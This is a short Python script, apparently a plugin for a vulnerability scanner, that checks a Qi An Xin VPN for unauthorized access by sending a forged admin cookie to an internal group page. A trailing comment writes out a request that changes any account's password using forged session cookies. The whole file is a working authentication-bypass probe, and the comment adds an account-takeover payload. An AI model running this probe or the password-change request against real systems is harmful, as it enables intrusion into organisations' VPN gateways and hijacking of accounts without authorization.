#coding:utf-8
import requests
import requests.packages.urllib3
requests.packages.urllib3.disable_warnings()
def msg():
  ret = {

      'links'     :  '',

      'huixian'   :  '',

      'method'    :   'post',

      'bugname'   :   '奇安信 VPN 未授权管理用户遍历(及任意账号密码修改未实现)',

      'level'     :   'critical',

      'FOFA'      :   '',

      'author'    :   'ppxfx',

      'ifbug'     :   False,
  }
  return ret
def run(url,ua):
  ret = msg()
  headers = {
      'User-Agent': ua,
      'Cookie': 'admin_id=1; gw_admin_ticket=1;'
      }
  target = '/admin/group/x_group.php?id=1'
  url1 = url + target
  ret['url'] = url1
  try:
    res=requests.get(url=url1,headers=headers,timeout=5,verify=False)
    if res.status_code == 200 and "group_action.php" in res.text and 'anonymous' in res.text:
      # ret['huixian'] = res.text
      ret['ifbug'] = True
      res.close()
      return ret
    else:
      return ret
  except:
    return ret
#     method: POST
#     path: /changepass.php?type=2
#     headers:
#       Cookie: admin_id=1; gw_user_ticket=ffffffffffffffffffffffffffffffff; last_step_param={"this_name":"anonymous","subAuthId":"1"}
#       Origin: "{{baseurl}}"
#       Referer: "{{baseurl}}/welcome.php"
#     body: old_pass=&password=a123456&repassword=a123456
